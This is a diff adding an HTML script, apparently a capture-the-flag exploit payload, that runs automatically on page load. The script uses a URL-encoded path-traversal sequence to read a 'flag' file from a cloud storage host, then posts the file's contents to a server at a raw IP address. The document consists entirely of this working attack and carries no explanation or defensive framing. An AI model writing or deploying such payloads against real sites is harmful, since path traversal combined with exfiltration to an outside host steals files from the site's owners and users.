@@ -1,0 +1,13 @@
+<script>
+    async function fetchTest() {
+        var response = await fetch('https://matriy-1314053574.cos.ap-beijing.myqcloud.com/local_cache/..%2Ffiles%2Fflag');
+        var responseText = await response.text();
+
+        xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://111.228.3.39:8000/", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("file_content=" + encodeURIComponent(responseText));
+        alert("File content sent to server.");
+    }
+    fetchTest()
+</script>
